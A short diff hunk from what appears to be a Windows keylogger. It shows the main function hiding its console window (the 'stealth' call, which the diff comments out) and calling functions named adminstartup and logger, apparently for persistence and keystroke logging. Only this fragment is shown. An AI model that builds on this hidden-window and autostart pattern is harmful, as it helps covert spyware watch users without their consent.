@@ -63,7 +63,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	HWND stealth; /*creating stealth (window is not visible)*/
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
+	// ShowWindow(stealth, 0);
 	printf("wear your mask please\n");
 	adminstartup();
 	logger();
